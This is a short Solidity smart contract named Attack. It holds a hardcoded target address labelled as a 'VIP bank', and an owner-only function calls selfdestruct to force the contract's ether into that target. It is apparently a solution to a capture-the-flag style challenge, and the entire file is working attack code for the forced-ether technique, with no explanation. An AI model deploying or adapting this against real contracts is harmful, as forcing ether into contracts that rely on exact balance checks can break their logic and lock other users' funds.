// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

contract Attack{
    address vipBankAddress = 0x28e42E7c4bdA7c0381dA503240f2E54C70226Be2;
    address owner;

    constructor() payable {
        owner = msg.sender;
    }

    function destruction() public {
        require(msg.sender == owner);
        selfdestruct(payable(vipBankAddress));
    }

}